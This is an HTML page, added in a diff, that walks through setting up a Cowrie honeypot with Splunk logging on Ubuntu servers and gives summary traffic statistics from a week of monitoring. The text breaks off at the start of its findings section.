@@ -1,0 +1,708 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Honeypot Cowrie Analysis</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="8f5d4c86-3177-4dda-b23e-c30705c0e78a" class="page sans"><header><h1 class="page-title">Honeypot Cowrie Analysis</h1><p class="page-description"></p></header><div class="page-body"><p id="ddde0132-44a4-4200-8ee8-13fcb1c7c76e" class="">
+</p><h2 id="50aea2dc-2a57-4b6d-b631-9b306f700c5d" class="">1. Introduction</h2><p id="85e39218-671c-48d5-a619-1195d5c0e506" class="">The primary objective of this honeypot deployment is to identify and analyze malicious activities targeting the network. By attracting and monitoring attackers, we aim to gather valuable intelligence on adversaries&#x27; attack patterns, techniques, and tools. This information will enhance our network security measures and develop more effective defense strategies.</p><p id="39d148ce-a948-4c98-b727-27e4499482a0" class="">
+</p><p id="01720829-4f4d-47bb-b876-0ccff5857306" class="">This report covers the deployment and monitoring of a high-interaction honeypot over a period of a week. The honeypot was placed within an isolated network to simulate vulnerable systems and attract potential attackers. The data collected during this period includes all incoming connections, attempted exploits, and captured malware samples.  By focusing on this specific timeframe and setup, we aim to provide a comprehensive analysis of the threats our network faces and recommend actionable security improvements</p><h2 id="5f3b5c29-69dc-4203-8ddf-3aefb85424e2" class="">2. Methodology</h2><p id="4196daa2-b99d-4fe3-aa2f-10fe81e8b3c8" class="">Recommend using a Linux Machine/Virutal Machine</p><p id="c24a9e6c-e110-457b-80d6-48b2aadf6b99" class="">Setup</p><ul id="54296f05-84ab-4a80-8904-61ae81da8478" class="bulleted-list"><li style="list-style-type:disc">Create two isolated ubuntu servers (Use Digital Ocean for server hosting) <ul id="69aec6e9-8c20-44a6-b6d7-07c9fe394b1b" class="bulleted-list"><li style="list-style-type:circle">One for the cowrie honeypot (1gb ram plan) </li></ul><ul id="cf6a6023-d9e9-41d5-83e5-d5258c2698ae" class="bulleted-list"><li style="list-style-type:circle">One for Splunk Enterprise (3 gb ram plan)</li></ul></li></ul><ul id="a9c43f34-19e7-469a-b405-6f5962f92368" class="bulleted-list"><li style="list-style-type:disc">Installing Honeypot<ul id="0721bb9c-68f8-44c5-8cbe-28a208efd40d" class="bulleted-list"><li style="list-style-type:circle">Firstly I recommend the following the cowrie documentation : <a href="https://cowrie.readthedocs.io/en/latest/INSTALL.html#step-1-install-system-dependencies">https://cowrie.readthedocs.io/en/latest/INSTALL.html#step-1-install-system-dependencies</a></li></ul><ul id="120d09b0-c618-4daf-a807-7e2a9dbc7bed" class="bulleted-list"><li style="list-style-type:circle">Before installing the dependencies, do a <strong>sudo apt update &amp;&amp; upgrade </strong></li></ul><ul id="2ae14275-899a-4b3e-a3b5-9a78638fb70d" class="bulleted-list"><li style="list-style-type:circle">Next, install the python3 virtual environment <ul id="ee267fca-72b9-45f4-b2e4-d7edcd188b92" class="bulleted-list"><li style="list-style-type:square">Sudo apt install python3-venv</li></ul></li></ul><ul id="295773ab-63f0-435c-a40d-54a9ddd03b82" class="bulleted-list"><li style="list-style-type:circle">Then do: <br/><br/><code>sudo apt-get install git python3-virtualenv libssl-dev libffi-dev build-essential libpython3-dev python3-minimal authbind virtualenv</code></li></ul><ul id="eadda39a-5d6e-4f49-95ce-369ce8d69cd4" class="bulleted-list"><li style="list-style-type:circle">Create a user account that is separate from root to prevent any security risk<br/><br/><code>sudo adduser --disabled-password cowrie</code></li></ul><ul id="d030a36d-49a4-4ed9-80b9-3b432d18b391" class="bulleted-list"><li style="list-style-type:circle">To switch users enter command: sudo su - cowrie</li></ul><ul id="29611565-6eff-42ce-a9d3-0d36162f43f8" class="bulleted-list"><li style="list-style-type:circle">Do a git clone to retrieve the cowrie honeypot files from the GitHub repository <br/><br/><code>git clone http://github.com/cowrie/cowrie</code></li></ul><ul id="4e1907dc-03a3-4606-a530-9a33d547433d" class="bulleted-list"><li style="list-style-type:circle">Next, navigate to the <strong>Cowrie </strong>directory and do <strong>ls </strong>command to check out the files</li></ul><ul id="36ce9b62-d73f-406c-9fb9-6a7dfb847006" class="bulleted-list"><li style="list-style-type:circle">The next set is to setup the virtual environment<ul id="b2a665a1-fe86-40e0-83c4-5af5207d93ae" class="bulleted-list"><li style="list-style-type:square">Run pwd to see which directory you are in<ul id="8c0737cf-f139-457b-b021-90f234f58ed5" class="bulleted-list"><li style="list-style-type:disc">Should be: home/cowrie/cowrie </li></ul></li></ul><ul id="668a7c1b-8188-4bf5-8227-c6ecfa2ac9f6" class="bulleted-list"><li style="list-style-type:square">Commands:<ul id="c93a80c3-2ef8-4df2-ba82-474f95320f19" class="bulleted-list"><li style="list-style-type:disc">python3 - m venv cowrie-env</li></ul><ul id="d329bec6-cf4b-4475-aa29-26e4af716b94" class="bulleted-list"><li style="list-style-type:disc">source cowrie-env/bin/activate</li></ul><ul id="9a93a4b8-66c1-4039-a75d-0afe01a8b90b" class="bulleted-list"><li style="list-style-type:disc">python3 -m pip install --upgrade pip</li></ul><ul id="a78068a1-1d59-4cb6-bf6b-58bab942ca9b" class="bulleted-list"><li style="list-style-type:disc">python3 -m pip install --upgrade -r requirements.txt</li></ul></li></ul></li></ul><ul id="b7953956-8c59-4823-8144-2d2035783455" class="bulleted-list"><li style="list-style-type:circle">Then set up new the configuration file<ul id="10870ec0-d93d-4e45-8d17-b770b5e2f3dc" class="bulleted-list"><li style="list-style-type:square">Run cp etc/cowrie.cfg.dist etc/cowrie.cfg<ul id="cc7e3705-5759-485f-bca5-3f4c4c41c44b" class="bulleted-list"><li style="list-style-type:disc">This is to allow </li></ul></li></ul><ul id="d6442453-7797-4cbd-91eb-004654a6af91" class="bulleted-list"><li style="list-style-type:square">Navigate to etc directory and do nano cowrie.cfg<ul id="fcb6ac5a-b727-41cd-a396-92fd1ecd7b5c" class="bulleted-list"><li style="list-style-type:disc">Change the server name to something that seems real <ul id="01ea5ef2-7fd8-4856-a8ec-1319de9432ff" class="bulleted-list"><li style="list-style-type:circle">Example: “ubuntu_server06”</li></ul></li></ul><ul id="e35f8697-d5db-44c9-94b5-5c8ba7af7c04" class="bulleted-list"><li style="list-style-type:disc">Then do ctrl+w and search for “[telnet]” and set “enabled” variable to “true”</li></ul></li></ul></li></ul><ul id="88e9e660-0cc8-43da-9fd3-93da2c95a69a" class="bulleted-list"><li style="list-style-type:circle">After this you could now set splunk for your honeypot</li></ul></li></ul><ul id="8d24222c-03e8-4a31-8f3e-9c2381bd3c2d" class="bulleted-list"><li style="list-style-type:disc">Splunk Enterprise installation<ul id="de5d373a-6481-4aeb-8977-6517d845bd3b" class="bulleted-list"><li style="list-style-type:circle">One the Splunk server mkdir new directory in splunk<ul id="90e58b97-edfe-4051-af7b-b9114406453b" class="bulleted-list"><li style="list-style-type:square">sudo mkdir /home/splunk</li></ul><ul id="8bbebed4-b24b-4e14-a566-9fb4a50c931b" class="bulleted-list"><li style="list-style-type:square">sudo chown splunk:splunk /home/splunk</li></ul></li></ul><ul id="dd0f2c5a-f93e-45fe-9f2a-b9a5b06decbc" class="bulleted-list"><li style="list-style-type:circle">Navigate to the Splunk Directory <ul id="0a464f9f-6912-4082-b7d8-4fe80f97787b" class="bulleted-list"><li style="list-style-type:square">Switch to the ‘/home/splunk’ directory:<ul id="e1bacdd3-4c3b-4c3d-a1c6-bb8d06b2948c" class="bulleted-list"><li style="list-style-type:disc">cd /home/splunk</li></ul></li></ul></li></ul><ul id="569f7864-3895-42cc-b3b0-fa2b798c3cc5" class="bulleted-list"><li style="list-style-type:circle">Firstly claim the free trial from this link: <a href="https://www.splunk.com/en_us/download/splunk-enterprise.html">https://www.splunk.com/en_us/download/splunk-enterprise.html</a></li></ul><ul id="2e61cd5d-aa13-40c3-9450-9133e08c9094" class="bulleted-list"><li style="list-style-type:circle">Once setting up your account, install Splunk via wget. Use the .deb file before installing it. Make sure to switch to the Splunk user.</li></ul><figure id="18850112-974b-454e-b831-9434789d8818" class="image"><a href="Untitled.png"><img style="width:680.0000610351562px" src="Untitled.png"/></a></figure><ul id="d1f574d2-4189-461f-8169-1b2d5fa943c7" class="bulleted-list"><li style="list-style-type:circle">Command: wget -O splunk-9.2.1-78803f08aabb-linux-2.6-amd64.deb &quot;<a href="https://download.splunk.com/products/splunk/releases/9.2.1/linux/splunk-9.2.1-78803f08aabb-linux-2.6-amd64.deb">https://download.splunk.com/products/splunk/releases/9.2.1/linux/splunk-9.2.1-78803f08aabb-linux-2.6-amd64.deb</a>&quot;</li></ul><ul id="6ee87f95-8c66-441f-9070-102af83f836c" class="bulleted-list"><li style="list-style-type:circle">sudo dpkg -i &lt;thesplunkinstallation file&gt;</li></ul><ul id="05e49116-3877-4a58-a22b-58d4fe4d895b" class="bulleted-list"><li style="list-style-type:circle">Once the installation is installed got /opt/splunk/bin <ul id="3e4778d4-91b7-4597-89bd-771a53ddcda5" class="bulleted-list"><li style="list-style-type:square">Then do “sudo ./splunk start<ul id="602ab15e-6365-4eea-aac7-080978cda313" class="bulleted-list"><li style="list-style-type:disc">Go through the licensing</li></ul></li></ul></li></ul><ul id="6ff53451-9a59-4cb0-85d2-f03953907573" class="bulleted-list"><li style="list-style-type:circle">After that enable boot-start<ul id="2728442e-979f-4c4b-890e-a3fed758e09a" class="bulleted-list"><li style="list-style-type:square">sudo ./splunk enable boot-start</li></ul></li></ul></li></ul><ul id="7e2221cd-b922-4b85-a6bb-856ad06c340a" class="bulleted-list"><li style="list-style-type:disc">Splunk HTTP Event Collector setup <ul id="42b052fa-c7f5-45ed-9c92-653841894425" class="bulleted-list"><li style="list-style-type:circle">Go to S<strong>ettings → Add data → Monitor → HTTP Event Collector </strong><ul id="8d25c572-10a4-43d9-bd06-1c79cbecae0d" class="bulleted-list"><li style="list-style-type:square">Give it a name and make sure <strong>Enable indexer acknowledgement </strong>is unchecked </li></ul><ul id="1c59168e-3c3a-4cbb-8f31-3f7f004e791e" class="bulleted-list"><li style="list-style-type:square">Source type = Automatic</li></ul><ul id="0f6146d7-35b8-4947-a0df-70de963034f7" class="bulleted-list"><li style="list-style-type:square">For the index create a new index called <strong>cowrie</strong> and select the item </li></ul><ul id="e0efa22e-762e-41a4-a91d-7777b742fc81" class="bulleted-list"><li style="list-style-type:square">Then, a token should be generated, which will be used in the cowrie.cfg file</li></ul></li></ul><ul id="e3687b4f-362d-4545-a845-93566210a714" class="bulleted-list"><li style="list-style-type:circle">Go to <strong>Settings → Data Inputs → Global Settings </strong><ul id="3d0c959f-5e3e-4600-bd63-6732aa2da958" class="bulleted-list"><li style="list-style-type:square">Enable SSL </li></ul><ul id="a91cdf04-3e40-49ed-ae01-d3949e418f89" class="bulleted-list"><li style="list-style-type:square">Set HTTP Port to 8080</li></ul></li></ul></li></ul><ul id="88331522-67bc-41fd-96bd-e8e0edd97f92" class="bulleted-list"><li style="list-style-type:disc">Cowrie Splunk Config Setup<ul id="545ca49b-93e9-4de5-80b3-67d742f70e8c" class="bulleted-list"><li style="list-style-type:circle">Navigate to cowrie.cfg file</li></ul><ul id="3f93171d-dc55-4f85-b46d-9206940e4be0" class="bulleted-list"><li style="list-style-type:circle">Once there do ctrl+w and enter “[output_splunk]”<ul id="8bd757cf-961a-4c00-8059-35ecc7faee5f" class="bulleted-list"><li style="list-style-type:square">Enable it </li></ul><ul id="2fb7cc24-a145-4eeb-bae8-90209196b5d6" class="bulleted-list"><li style="list-style-type:square">Edit the token and URL variable<ul id="bcb25552-6bef-499a-8004-f9435159f8e4" class="bulleted-list"><li style="list-style-type:disc">Put the token that you generated from splunk </li></ul><ul id="4c0fcfab-5005-43e2-9a41-7dda1f0856a1" class="bulleted-list"><li style="list-style-type:disc">Replace <a href="http://localhost">localhost</a> with your splunk server IP </li></ul></li></ul></li></ul></li></ul><h2 id="ec5d55da-9a5e-4b44-89a8-4367538da2b4" class="">3. Data Analysis</h2><p id="88268ddb-9b4e-44d8-9ac8-822e8a1f1ca4" class="">Traffic Overview: </p><p id="7ff96703-dacc-4817-9811-eeb5d22cfeb2" class="">Captured over 380738 connections with 4078 unique IP addresses. 11,374 login successes and 15,295 Failed logins by the attackers. The majority of the connection access was through SSH with 24,538 connections and 4,611 connection access through Telnet. There were a few rarities of connections such as using ports 443, 587, 80.  Between the time ranges of 06/13/2024 - 06/19/2024 the day with the most logs was 06/19/2024. </p><h2 id="5069ca53-e50b-4f46-9af2-8e0f2a32b69b" class="">4. Findings</h2><p id="06c5b2af-a4ce-4f6f-bb22-ba7a29d1deb8" class="">After looking through the event 